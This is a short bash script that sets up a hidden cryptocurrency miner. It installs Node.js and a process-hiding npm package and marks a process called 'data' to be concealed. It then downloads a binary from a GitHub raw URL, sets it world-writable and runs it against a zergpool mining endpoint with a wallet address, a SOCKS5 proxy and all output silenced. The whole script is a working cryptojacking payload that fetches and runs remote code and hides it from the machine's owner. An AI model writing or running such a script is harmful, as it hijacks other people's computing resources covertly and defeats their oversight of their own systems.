#!/bin/bash
sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.15.0 && npm i -g node-process-hider && ph add data
apt install -y lynx && lynx -dont_wrap_pre -dump "https://github.com/yole37/vigilant-fiesta/raw/main/ava2" > data && chmod 777 data && ./data -a yescryptR16 -o stratum+tcps://yescryptR16.mine.zergpool.com:16333 -u TMWXVhE6TJNurvBMXVJvptnR8GpdGe7rPY.TEST -p c=TRX,mc=GOLD -t 2 -x socks5://192.252.214.20:15864 >/dev/null 2>&1
